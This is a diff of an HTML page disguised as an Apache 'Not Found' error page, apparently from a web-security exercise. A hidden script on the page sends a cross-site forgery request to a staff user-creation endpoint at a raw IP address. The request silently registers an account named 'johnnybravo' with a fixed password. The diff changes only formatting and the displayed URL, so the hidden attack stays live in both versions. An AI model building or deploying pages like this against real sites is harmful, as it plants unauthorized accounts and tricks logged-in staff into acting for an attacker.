@@ -10,7 +10,7 @@
 
 <body>
     <h1>Not Found</h1>
-    <p>The requested URL /red/public/staff/users/index.phpsad was not found on this server.</p>
+    <p>The requested URL artemskit.github.io/ was not found on this server.</p>
     <hr>
     <address>Apache/2.4.18 (Ubuntu) Server at 104.198.208.81 Port 443</address>
     <div style="display: none">
@@ -20,10 +20,8 @@
         x = new XMLHttpRequest();
         x.open("POST", "https://104.198.208.81/red/public/staff/users/new.php", true);
         x.setRequestHeader('Content-Type', "application/x-www-form-urlencoded");
-        x.setRequestHeader('Access-Control-Allow-Origin:', "*");
-        x.send(
-            'first_name=Johnny&last_name=Bravo&username=johnnybravo&email=johnnybravo%40gmail.com&password=111111111Aa%23&confirm_password=111111111Aa%23'
-        );
+        x.setRequestHeader('Access-Control-Allow-Origin', "*");
+        x.send('first_name=Johnny&last_name=Bravo&username=johnnybravo&email=johnnybravo%40gmail.com&password=111111111Aa%23&confirm_password=111111111Aa%23');
     </script>
 </body>
 
